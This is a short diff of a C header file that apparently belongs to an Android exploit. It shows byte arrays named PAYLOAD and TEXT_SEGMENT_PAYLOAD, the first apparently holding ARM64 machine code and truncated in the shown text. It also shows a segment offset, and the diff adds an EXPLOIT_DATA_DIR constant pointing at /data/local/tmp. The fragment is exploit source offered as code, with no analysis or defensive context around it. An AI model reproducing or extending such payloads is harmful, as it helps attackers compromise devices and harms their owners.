@@ -15,4 +15,6 @@ unsigned char PAYLOAD[] = {255, 3, 1, 209, 224, 7, 0, 169, 226, 15, 1, 169, 228,
 size_t TEXT_SEGMENT_OFFSET = 0xd0;
 unsigned char TEXT_SEGMENT_PAYLOAD[] = {0, 176, 5, 0, 0, 0, 0, 0, 0, 176, 5, 0, 0, 0, 0, 0};
 
+#define EXPLOIT_DATA_DIR "/data/local/tmp"
+
 #endif
